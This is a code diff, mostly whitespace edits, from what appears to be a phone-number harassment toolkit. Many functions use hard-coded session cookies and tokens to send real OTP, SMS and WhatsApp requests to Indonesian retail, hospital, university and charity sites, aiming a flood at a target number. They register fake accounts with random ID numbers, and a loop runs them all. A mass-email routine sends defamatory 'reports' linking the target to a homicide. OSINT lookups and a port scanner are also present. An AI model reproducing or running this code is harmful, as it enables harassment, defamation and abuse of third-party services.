         if not phone.startswith('62'):
             phone = '62' + phone
-        
+
         phone = '+' + phone
-        
+
         import subprocess
         import json
-        
+
         curl_cmd = f"""curl -s -X POST 'https://www.99.co/id/api/biz/messaging/otp-events' \\
   -H 'host: www.99.co' \\
   -H 'sec-ch-ua-platform: "Android"' \\
@@ -5211,9 +5213,9 @@ def spam_otp_99co(nomor):
   -H 'cookie: _99-acs-token=eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJybzJ6ZThOYkFNUW1QTlVVZFcwTjItNnE5bWNleHJHcHdFNS0xd3hQQWJzIn0.eyJleHAiOjE3ODcxNDg1MDcsImlhdCI6MTc4NzE0NDkwNywianRpIjoiMGJiNTk2NmUtNWFjYS00NGJiLWExYTMtNjMzNGQ3MjlkMjEyIiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiMjY3N2Y0MDAtOTVlNC00NjEzLWJlY2UtZWVkYzM0ZDE2OWE0IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiZnJvbnRlbmQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6IjMyMDhhYmU0LTI1ZjctNDIwMi1hNzljLTdkYjQ3Mzk3YzFkZSIsImFjciI6IjEiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsic2VsbGVyIiwidW1hX2F1dGhvcml6YXRpb24iLCJkZWZhdWx0LXJvbGVzLTk5aWQtcHJvZCIsImJ1eWVyIl19LCJzY29wZSI6InByb2ZpbGUtbWluaW1pemUgY29yZS11dWlkIGVtYWlsIiwic2lkIjoiMzIwOGFiZTQtMjVmNy00MjAyLWE3OWMtN2RiNDczOTdjMWRlIiwiY29yZV91dWlkIjoiNTkxNzJkNjktODI1Ni00MWRlLWIxYTktZmFlYjQ4ODM1ZThlIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJjb3JlX2NvbnN1bWVyX3V1aWQiOiJjYTE5YTJhZC1lMTlkLTQ3YTMtOGQwZS0yMzJhNjhiOGIyOTgiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJ0ZXN0aW1vbmkgYWFhYTgjODMiLCJjb3JlX2N1c3RvbWVyX3V1aWQiOiIyNjZlYzAzYS1iZTczLTQzZWQtODEyNi02NDZjMzc2MjkxYmYiLCJlbWFpbCI6InRlc3RpbW9vb3Nra2RqczE5bWlAZ21haWwuY29tIn0.VqqVrTIAPNKv9dCTEvXfRjopfv2Pp2q1vviklB2kqMHuCSmVoYfA1OqrZF6W8qEo5cVL6joSsxTplMqHM6Da-w; _99-ref-token=eyJhbGciOiJIUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICI0MjllZjYyYy03NDU4LTRhMDQtOTNlNC1mMDJjYWNiZjY4NTcifQ.eyJleHAiOjE3ODc3NDk3MDcsImlhdCI6MTc4NzE0NDkwNywianRpIjoiZjI3OTlmYjktYTQ5ZC00MjY4LTk3MzEtMDE1NTExNWE2ODUxIiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwiYXVkIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiMjY3N2Y0MDAtOTVlNC00NjEzLWJlY2UtZWVkYzM0ZDE2OWE0IiwidHlwIjoiUmVmcmVzaCIsImF6cCI6ImZyb250ZW5kLWFwcCIsInNlc3Npb25fc3RhdGUiOiIzMjA4YWJlNC0yNWY3LTQyMDItYTc5Yy03ZGI0NzM5N2MxZGUiLCJzY29wZSI6InByb2ZpbGUtbWluaW1pemUgY29yZS11dWlkIGVtYWlsIiwic2lkIjoiMzIwOGFiZTQtMjVmNy00MjAyLWE3OWMtN2RiNDczOTdjMWRlIn0.40VVHypaU2lxlcNif3cyNKNQ6NqCESpC9F6gpa4R4TA; country=ID; _fbp=fb.1.1783634838553.530234959419040031; __cf_bm=mHd7ebZZvr9QC4g39gJRTX7n8RbxTABa2vptnPN2jnY-1787144797.8016622-1.0.1.1-XuJ5D0MeHxyWcNU8ijk.OhbYJMH9JyHuoOPWG8NxQlnURKBzM92HhOPEnC22T6gv1lGsn.Q94dkbDfxAh0obTw30tgNFaVAYsKCcoHDul_e5o4iQ3AdY4oQVdsRmqus9; NEXT_LOCALE=en; nid=1468adb9-ef60-4b93-80f8-67f6d905429b; ajs_anonymous_id=1468adb9-ef60-4b93-80f8-67f6d905429b; WZRK_G=c5063a1d88cc4d57b481ff69e6271672; WZRK_S_6Z6-5Z4-R56Z=%7B%22p%22%3A1%2C%22s%22%3A1787144803%2C%22t%22%3A1787144805%7D; dbb_rum=%7B%22date%22%3A1787144796651%2C%22id%22%3A%22mt03vai3tjl67ja56e.i%22%2C%22hnc%22%3A1%2C%22nc%22%3A1%2C%22conv%22%3A%5B%5D%2C%22sample%22%3Afalse%7D; g_state={"i_l":0,"i_ll":1787144808996,"i_b":"4d9tCoq6T065IxLpbI3/B9pCnohc4rpf66c/WYlUFiM","i_e":{"enable_itp_optimization":24},"i_et":1787144808996}; _xsrf=2|c7bf88e2|2ee5e97e7c0d5421580d7ed032370b4e|1787144810; _gcl_au=1.1.642346103.1783634927; _gid=GA1.2.998693239.1787144812; _ga_6C5VMQ1JNP=GS2.1.s1787144812$o1$g0$t1787144813$j59$l0$h0; _ga_GG21BH9GS5=GS2.1.s1787144813$o1$g0$t1787144813$j60$l0$h0; __rtbh.uid=%7B%22eventType%22%3A%22uid%22%2C%22id%22%3A%22unknown%22%2C%22expiryDate%22%3A%222027-08-19T13%3A06%3A54.597Z%22%7D; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22GAhcAYFrDoxEYfSp94nX%22%2C%22expiryDate%22%3A%222027-08-19T13%3A06%3A54.600Z%22%7D; _ga_9FDXXVZSH0=GS2.1.s1787144814$o1$g0$t1787144814$j60$l0$h0; meid=ddb8aaf2-e634-40d3-bdde-198c0d309838; intercom-id-e90pxaa2=a14209fa-dc61-4abe-94cc-e50af422bdd5; intercom-session-e90pxaa2=; intercom-device-id-e90pxaa2=154bdeab-bd24-418e-b61a-3d77de4e79b9; _ga_ZJWD7VVPHG=GS2.2.s1787144822$o2$g0$t1787144822$j60$l0$h0; _ga=GA1.1.1461816152.1783634837; cto_bundle=RcS8X19sbFllSDZ6eG1VcEtESVM0ZDglMkJycFA1RlFIRGg4WGxyS01OcUV3MjdYVlZtdlhrcUglMkJ1c2J6MXN6UTVHVjR0Mnc5ZHkzZDdzOVVRcVVTOVlKUXlTUTZXV3BDeVZ6UXNmbzZhc0tBS1ElMkIxUzclMkJSYUx2NzZ2UDU3OURyY0lhc0tiaFc2JTJCa0dHRWlFSm1meWhMakZtMEJRJTNEJTNE; _ga_Q823T54LSF=GS2.1.s1787144823$o2$g1$t1787144905$j38$l0$h0' \\
   -H 'priority: u=1, i' \\
   -d '{{"brand":"99id","destination_address":"{phone}","type_id":2}}'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -5225,7 +5227,7 @@ def spam_otp_99co(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
 
@@ -5239,15 +5241,15 @@ def spam_otp_bunda_cms(nomor):
             phone = '0' + nomor[3:]
         else:
             phone = '0' + nomor
-        
+
         phone = ''.join(filter(str.isdigit, phone))
-        
+
         if not phone.startswith('0'):
             phone = '0' + phone
-        
+
         import subprocess
         import json
-        
+
         curl_cmd = f"""curl -s -X POST 'https://cms.bunda.co.id/api/v1/auth/send-otp' \\
   -H 'host: cms.bunda.co.id' \\
   -H 'sec-ch-ua-platform: "Android"' \\
@@ -5267,9 +5269,9 @@ def spam_otp_bunda_cms(nomor):
   -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
   -H 'priority: u=1, i' \\
   -d '{{"phone_number":{phone},"type":"auth"}}'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -5281,10 +5283,10 @@ def spam_otp_bunda_cms(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
-        
+
 def spam_otp_eiger(nomor):
     try:
         if nomor.startswith('0'):
@@ -5295,17 +5297,17 @@ def spam_otp_eiger(nomor):
             phone = nomor
         else:
             phone = '+62' + nomor
-        
+
         phone = ''.join(filter(str.isdigit, phone))
-        
+
         if not phone.startswith('62'):
             phone = '62' + phone
-        
+
         phone = '+' + phone
-        
+
         import subprocess
         import json
-        
+
         curl_cmd = f"""curl -s -X POST 'https://careloyalty.eigerindo.co.id/api/v1/otp/send' \\
   -H 'host: careloyalty.eigerindo.co.id' \\
   -H 'sec-ch-ua-platform: "Android"' \\
@@ -5322,9 +5324,9 @@ def spam_otp_eiger(nomor):
   -H 'accept-encoding: gzip, deflate, br, zstd' \\
   -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
   -d '{{"mobile_phone":"{phone}","via":"whatsapp"}}'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -5336,10 +5338,10 @@ def spam_otp_eiger(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
-        
+
 def spam_otp_pkumayong(nomor):
     try:
         if nomor.startswith('0'):
@@ -5350,15 +5352,15 @@ def spam_otp_pkumayong(nomor):
             phone = '0' + nomor[3:]
         else:
             phone = '0' + nomor
-        
+
         phone = ''.join(filter(str.isdigit, phone))
-        
+
         if not phone.startswith('0'):
             phone = '0' + phone
-        
+
         import subprocess
         import json
-        
+
         curl_cmd = f"""curl -s -X POST 'https://reservasi.pkumayong.com/reqOTP' \\
   -H 'host: reservasi.pkumayong.com' \\
   -H 'sec-ch-ua-platform: "Android"' \\
@@ -5378,9 +5380,9 @@ def spam_otp_pkumayong(nomor):
   -H 'cookie: XSRF-TOKEN=eyJpdiI6IlFydHpESGdLMTRCSFR2cmczOUE1b2c9PSIsInZhbHVlIjoiaks0WkgzMEtHVWlMZWY5ZXFlUHVkTmJ2cURNQmw5V0JkeThPcm9MY01jVzZXSUZzc1RQU2RQdnZMOW43NHc1YVBpeldxNVN6V2h6cUpReUZyQkNoeWc9PSIsIm1hYyI6IjM0YzY0NDI3NjE2MjZhMjBmYWQ4ODMzMDRjYTVmYzRlYThiMmEyNTljNjNmNzNjOTNkNmVhYzRkMDM0OGUzNmYifQ%3D%3D; laravel_session=eyJpdiI6ImFPYTl6djJpUGhYWjAxSGJpQThnWlE9PSIsInZhbHVlIjoiaExkQU02Q2diRnczM2RESzNxOTN3enBNYUdhOTRwYWNkSGpoK3ZpNm1QOUxJY3hBZ20yKzJMXC9yc0FReGRQUnlXSXBkS3dLSUxiMFNHelFNSmhpQ3FnPT0iLCJtYWMiOiJmY2IyYzYyYzAyZWE1NjlhYmUxZjlmMGJmNmQ4MTQ3MTMzNTBjMzA4Njc3MzYyYzQ1OTQxNzU5OTc3OTlhMjVhIn0%3D' \\
   -H 'priority: u=1, i' \\
   --data-raw '_token=VNbW1nBJZCtIWp0264iC0O2ao5qVpGRCpX9UW1NW&nohp={phone}'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -5392,7 +5394,7 @@ def spam_otp_pkumayong(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
 
@@ -5417,12 +5419,12 @@ def spam_otp_babyhappy(nomor):
             phone = nomor[3:]
         else:
             phone = nomor
-        
+
         phone = ''.join(filter(str.isdigit, phone))
-        
+
         import subprocess
         import json
-        
+
         curl_cmd = f"""curl -s -X POST 'https://club.babyhappydiapers.com/api/registration/resend-otp-phone' \\
   -H 'host: club.babyhappydiapers.com' \\
   -H 'sec-ch-ua-platform: "Android"' \\
@@ -5441,9 +5443,9 @@ def spam_otp_babyhappy(nomor):
   -H 'cookie: _gcl_au=1.1.1607778853.1787457141; _ga=GA1.1.345266246.1787457141; _tt_enable_cookie=1; _ttp=01M0PBZ2G221DTCR2TCZP9NR5J_.tt.1; _fbp=fb.1.1787457144780.679918106559872972.AQYAAQIB; ttcsid_D6J6BNRC77UCPJEO2GU0=1787457145405::yZHNrp369Xay2lZSg8Ah.1.1787457156785.1; cphone={phone}; _gcl_gs=2.1.k1$i1787457792$u37029106; _gcl_aw=GCL.1787457796.CjwKCAjwkaXUBhASEiwAZI3ds8_i9ubY7AiAmkjJ6S2JxDvkIP3eWg1n09EdLYlRyHm_otGZPRiQOxoCOH0QAvD_BwE; ttcsid=1787457145411::Ue7LBTLOfkm-jeYclKyU.1.1787457846118.0::1.670669.651725::700582.25.326.828::685893.16.125; ttcsid_D7SQ6T3C77U4TTGIHFM0=1787457145433::EJ3SqZp4PDfpKlkAnNZT.1.1787457846120.1; _ga_KKVZ5M822G=GS2.1.s1787457141$o1$g1$t1787457846$j9$l0$h0' \\
   -H 'priority: u=1, i' \\
   -d '{{"phone":"{phone}"}}'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -5455,7 +5457,7 @@ def spam_otp_babyhappy(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
 
@@ -5469,16 +5471,16 @@ def spam_otp_els(nomor):
             phone = nomor
         else:
             phone = '62' + nomor
-        
+
         phone = ''.join(filter(str.isdigit, phone))
-        
+
         import subprocess
         import json
         import random
         import string
-        
+
         name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 7)))
-        
+
         curl_cmd = f"""curl -s -X POST 'https://member.els.id/api/publics/membership/auth/otp/register/send' \\
   -H 'host: member.els.id' \\
   -H 'sec-ch-ua-platform: "Android"' \\
@@ -5496,9 +5498,9 @@ def spam_otp_els(nomor):
   -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
   -H 'cookie: _gcl_au=1.1.838671011.1787470004; _ga=GA1.1.682741423.1787470005; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-08-23%2007%3A26%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fels.id%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-08-23%2007%3A26%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fels.id%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F151.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fels.id%2F; cf_clearance=u6Yw53DFZSn56DwrIlr_ZxIJ9QfqwnH2LibY8_8COnI-1787470010-1.2.1.1-_Yzp10QlUiRV7_dM.hIBu_eQ3j3H1PjSGu1muhrB4u_RL0xoU8qhCyhl.N3cRybkTtmjWUhDR67gbn9HDIdr00a2BrABvmCMw8UEUo0e0aU2M3I9tnuq6rNMdEyNQm4Xba4pBLulS543BCbF.BGwHOhtvHDuLDN5acRtj9dibyAytzGMrvioCMqvNZxo7yxNb2YWZSjJdkyGp9kAwNCxYNl5_1JQFV7BxjNGKWwjsYxwxR.V1NU6M6X60TAIR5e9PLg2EvtnobHKN0BN2L__rm21D8d32j1hU0zbYeg5dAYipblrEk6X1JwYTUMSoO1bxZ8nJOFpq.HJ.1.QBfBb9nzY7jioh7dIdfxkoJ9I73s; _ga_E3DHK5EHFD=GS2.1.s1787470004$o1$g1$t1787470057$j7$l0$h0; ESODA_ELS_MEMBERSHIP=4612f1cd046264b1e30adf495e046db0; _ga_JT6HY1CYT1=GS2.1.s1787470070$o1$g0$t1787470071$j59$l0$h0' \\
   -d '{{"name":"{name}","mobilephone":"{phone}"}}'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -5510,7 +5512,7 @@ def spam_otp_els(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
 
@@ -5524,12 +5526,12 @@ def spam_otp_dreamdubai(nomor):
             phone = nomor[3:]
         else:
             phone = nomor
-        
+
         phone = ''.join(filter(str.isdigit, phone))
-        
+
         import subprocess
         import json
-        
+
         curl_cmd = f"""curl -s -X POST 'https://www.dreamdubai.com/send-sms-web' \\
   -H 'host: www.dreamdubai.com' \\
   -H 'sec-ch-ua-platform: "Android"' \\
@@ -5549,9 +5551,9 @@ def spam_otp_dreamdubai(nomor):
   -H 'cookie: cquid=||; __cq_dnt=0; dw_dnt=0; dwac_7bec52bd774fafa7db63dd4057=W4-0OarJWqvCtL9Z7KY1EK9krjnjhcv-1hY%3D|dw-only|||AED|false|Asia%2FDubai|true; cqcid=abvjR9yv05ESdLZnHR91lRWUF1; sid=W4-0OarJWqvCtL9Z7KY1EK9krjnjhcv-1hY; dwanonymous_4331083bd03400c189943d61e1cec6f3=abvjR9yv05ESdLZnHR91lRWUF1; dwsid=twdRkKTkmCImlUsRMH9LBkPsS5DtqAl3MjcZ87C95egkhfzbVC7cgsGVHXVBcgEW7HRjl0WmItTbDoKBKWbsAQ==; _gcl_au=1.1.1946167819.1787471764; _ga=GA1.1.1950809663.1787471765; _scid=1NHPZChyXKzc0jProZl2Ysvmi_xSTkDN; _scid_r=1NHPZChyXKzc0jProZl2Ysvmi_xSTkDN; _tt_enable_cookie=1; _ttp=01M0PSX8SNJVMS4Z4RMC04KFE5_.tt.1; _fbp=fb.1.1787471766583.518002055353343985; __cq_uuid=abvjR9yv05ESdLZnHR91lRWUF1; __cq_seg=0~0.00!1~0.00!2~0.00!3~0.00!4~0.00!5~0.00!6~0.00!7~0.00!8~0.00!9~0.00; adjust_web_uuid=01084d62-d6eb-46f0-1e7a-2ea4a6d74006; moe_uuid=f12354a2-ff50-4ca4-a11c-894991f0c79e; _ga_5SBWDJD7BR=GS2.1.s1787471764$o1$g1$t1787471783$j41$l0$h0; ttcsid=1787471766394::iLRSmXWkEDcPZtKcpYlf.1.1787471796796.0::1.-6089.0::30175.5.347.429::0.0.0; ttcsid_CMSC9GJC77U67KV9FM3G=1787471766387::4t-aqwqsjjEKeGJ_Bmt5.1.1787471796797.1' \\
   -H 'priority: u=1, i' \\
   --data-raw 'phoneNumber={phone}&countryCode=%2B62&isApp=false&mode=whatsapp-otp'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -5563,7 +5565,7 @@ def spam_otp_dreamdubai(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
 
@@ -5577,15 +5579,15 @@ def spam_otp_bukuaku(nomor):
             phone = '0' + nomor[3:]
         else:
             phone = '0' + nomor
-        
+
         phone = ''.join(filter(str.isdigit, phone))
-        
+
         if not phone.startswith('0'):
             phone = '0' + phone
-        
+
         import subprocess
         import json
-        
+
         curl_cmd = f"""curl -s -X POST 'https://bukuaku.id/base/forgot_password' \\
   -H 'host: bukuaku.id' \\
   -H 'sec-ch-ua-platform: "Android"' \\
@@ -5604,9 +5606,9 @@ def spam_otp_bukuaku(nomor):
   -H 'cookie: auth.strategy=local; cf_clearance=XqnbImZU1JDSaShhb_lmYSpQqKmmCO9LXzhupeLjb4Q-1787472072-1.2.1.1-QHXLCp4nn93kWxK329lkkBmufK61MrozGvisAi5I63FFG9hOuxAma36dmo1zR_6WDUUGtMKeWjunD.ZVtfBH2naodVEMlOIAbS1gr7UfK5rIGFZOOeoReHAxz_6JUcOZibiR1Eyi64cokdS0l0d2qSoclc86B8J.BNNgGDAE_nGxci1_vsnCw5sfFeWtB5khVDMOks7FA7CEJ_pVcX9gyk53ovGK.8Z7uUlgYm9iS_zebMc4pprAjKdDrueY5Zy12Pky.BIJQJFYqtdechKNkk4bXrch1XONusumwCGokSdr7cmalMeSZXeLgMOq4Ddv8jl5G.ybxcHwECWUY3kr_303wQpLvS7TE9p0PT.Xej0; _gcl_au=1.1.984154179.1787472072; _ga=GA1.1.250152120.1787472073; _ga_9KQFL3Q499=GS2.1.s1787472072$o1$g1$t1787472585$j60$l0$h0; _ga_GN7DGX69XZ=GS2.1.s1787472073$o1$g1$t1787472586$j59$l0$h0' \\
   -H 'priority: u=1, i' \\
   -d '{{"otp_type":"WA","phone":"{phone}"}}'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -5618,7 +5620,7 @@ def spam_otp_bukuaku(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
 
@@ -5632,15 +5634,15 @@ def spam_otp_starlite(nomor):
             phone = '0' + nomor[3:]
         else:
             phone = '0' + nomor
-        
+
         phone = ''.join(filter(str.isdigit, phone))
-        
+
         if not phone.startswith('0'):
             phone = '0' + phone
-        
+
         import subprocess
         import json
-        
+
         curl_cmd = f"""curl -s -X POST 'https://starliteindonesia.com/api/customer-registration/phone-otp/request' \\
   -H 'host: starliteindonesia.com' \\
   -H 'sec-ch-ua-platform: "Android"' \\
@@ -5659,9 +5661,9 @@ def spam_otp_starlite(nomor):
   -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
   -H 'cookie: _ga=GA1.1.688980367.1787486216; _gcl_au=1.1.1809383858.1787486217; _fbp=fb.1.1787486217519.84569997662616804; _tt_enable_cookie=1; _ttp=01M0Q7P9JFTT6QXYBSCJ02DM2B_.tt.1; _ga_1ST28GMNXL=GS2.1.s1787486216$o1$g1$t1787486240$j36$l0$h0; _ga_DFWC1L1VBM=GS2.1.s1787486218$o1$g1$t1787486240$j38$l0$h0; ttcsid=1787486217851::Tc3BK0KkD3xGc2Lw3-TR.1.1787486318913.0::1.12616.0::100794.12.441.383::0.0.0; ttcsid_D6N6GJRC77U5VG9U4DSG=1787486217846::JJVvUOjr14dqXefVXgI6.1.1787486318914.1' \\
   -d '{{"phone_number":"{phone}"}}'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -5673,10 +5675,10 @@ def spam_otp_starlite(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
-        
+
 def spam_otp_unpatti(nomor):
     try:
         if nomor.startswith('0'):
@@ -5687,19 +5689,19 @@ def spam_otp_unpatti(nomor):
             phone = nomor
         else:
             phone = '62' + nomor
-        
+
         phone = ''.join(filter(str.isdigit, phone))
-        
+
         import subprocess
         import json
         import random
         import string
-        
+
         name = ''.join(random.choices(string.ascii_lowercase, k=8))
         email = f"{name}{random.randint(100,999)}@gmail.com"
         nik = ''.join([str(random.randint(0,9)) for _ in range(16)])
         password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%^&*", k=16))
-        
+
         curl_cmd = f"""curl -s -X POST 'https://mandiri.pmb.unpatti.ac.id/api/v1/register/request-otp' \\
   -H 'host: mandiri.pmb.unpatti.ac.id' \\
   -H 'sec-ch-ua-platform: "Android"' \\
@@ -5716,9 +5718,9 @@ def spam_otp_unpatti(nomor):
   -H 'accept-encoding: gzip, deflate, br, zstd' \\
   -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
   -d '{{"nama":"{name}","email":"{email}","no_telp":"{phone}","nik":"{nik}","tanggal_lahir":"2002-09-11","password":"{password}","password_confirmation":"{password}"}}'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -5730,7 +5732,7 @@ def spam_otp_unpatti(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
 
@@ -5746,9 +5748,9 @@ def spam_otp_ykkipeduli(nomor):
             phone = "62" + phone
         else:
             phone = "62" + phone
-        
+
         email = f"user{int(time.time())}{''.join(random.choices(string.ascii_lowercase + string.digits, k=6))}@gmail.com"
-        
+
         curl_cmd = f"""curl -s -X POST 'https://ykkipeduli.org/register/sahabat/send-otp' \\
   -H 'host: ykkipeduli.org' \\
   -H 'sec-ch-ua-platform: "Android"' \\
@@ -5768,9 +5770,9 @@ def spam_otp_ykkipeduli(nomor):
   -H 'cookie: XSRF-TOKEN=eyJpdiI6IkJ1NGxNSERac0M2WWR5eElhbkU4WEE9PSIsInZhbHVlIjoiQzJwM0xveXcrU2Y0eXkrY2JkTFEyWm15YVhRbzNYWkF3WDQ5MmtLczBCc1Y4NHhjQi9mU3ZPQTVaVUJNdWFZZ2hrSHFKUFdwK0dDT25VS1ovcDNSL1NoeDVWV3NIY2NuekhjeGVpc1FDb2U1cjNZTHRYZ1V3bGJPWEFjQXRXS1IiLCJtYWMiOiI2YjAxNjRkNmZkN2M0YTc3NDUwNDgyOTRiZTQ0MzYzOTM4M2FmODAxOGViMGYxYjQzYzAyY2E2ZTRlZDg0NjJhIiwidGFnIjoiIn0%3D; ykki-session=eyJpdiI6Imx4dFpJZnNwbGN6S3FFMm9maEZta2c9PSIsInZhbHVlIjoiQXRsWC9xMm5KaTVqUTAzYlNTckNnYlIxc1dML2xVOFljSzlzK1ZQK3Z5RkJHZzRKL3VNQlNNN0JwZm02RGs1SHlTNVUrallueDRrc3o3aEZMVDNKaE9iR1lmT2NBdXdwQ3FCd0paT2psNEx4YkV3ZDRQcDEwMDlIYjZQQVNhTDkiLCJtYWMiOiI1M2VkYjBkY2M2ZTQzOTE2YzZlYWYxNDAzMmNmOGIzYjliMWQwNzcxZmM4YjI2NTc1ZTNhNzg3NWUxMGY3NjMxIiwidGFnIjoiIn0%3D' \\
   -H 'priority: u=1, i' \\
   -d '{{"name":"testimoni","phone":"{phone}","email":"{email}","password":"5fnzSTRcW38wBNG","password_confirmation":"5fnzSTRcW38wBNG","account_type":"donatur"}}'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -5782,7 +5784,7 @@ def spam_otp_ykkipeduli(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
 
@@ -5909,7 +5911,7 @@ def run_spam_otp(nomor):
         ("Unpatti", spam_otp_unpatti),
         ("Ykkipeduli", spam_otp_ykkipeduli),
     ]
-    
+
     results = []
     for name, func in apis:
         try:
@@ -5920,7 +5922,7 @@ def run_spam_otp(nomor):
         except:
             results.append(f"❌ {name}: Error")
         time.sleep(0.2)
-    
+
     return results
 
 # ===================== FUNGSI SPAM GMAIL =====================
@@ -6059,7 +6061,7 @@ Abaixo está uma foto da vítima de homicídio 🔪🔪
 Para mais informações sobre essa novidade maluca entre em contato pelo nosso WhatsApp 💬👇
 
 https://web.whatsapp.com/xxx.canais/qioconvidativo/telefone/enviar?número={nomor}"""
-        
+
         msg = MIMEMultipart()
         msg['From'] = sender_info['email']
         msg['Subject'] = subject
@@ -6080,11 +6082,11 @@ def run_spam_report(nomor):
     for sender in senders:
         try:
             if kirim_report_email(sender, nomor):
-                results.append("")
+                results.append("berhasil✅")
             else:
-                results.append("")
+                results.append("Gagal❌")
         except:
-            results.append("")
+            results.append("Error❌")
         time.sleep(0.5)
     return results
 
@@ -6118,7 +6120,7 @@ def osint_nomor(nomor):
         parsed = phonenumbers.parse(nomor, None)
         valid = phonenumbers.is_valid_number(parsed)
         possible = phonenumbers.is_possible_number(parsed)
-        
+
         return {
             "nomor": nomor,
             "valid": "Ya" if valid else "Tidak",
@@ -6235,7 +6237,7 @@ def osint_username(username):
             ("DuckDuckGo", "https://duckduckgo.com/?q={username}"),
             ("Yandex", "https://yandex.com/search/?text={username}"),
         ]
-    
+
     found = []
     for name, url in platforms:
         try:
@@ -6282,7 +6284,7 @@ def tool_port_scanner(domain):
             993: "IMAPS", 995: "POP3S", 3306: "MySQL", 3389: "RDP",
             5432: "PostgreSQL", 5900: "VNC", 6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt"
         }
-        
+
         for port in common_ports:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -6345,11 +6347,11 @@ def tool_roblox_checker(username):
         return None
     except:
         return None
-        
+
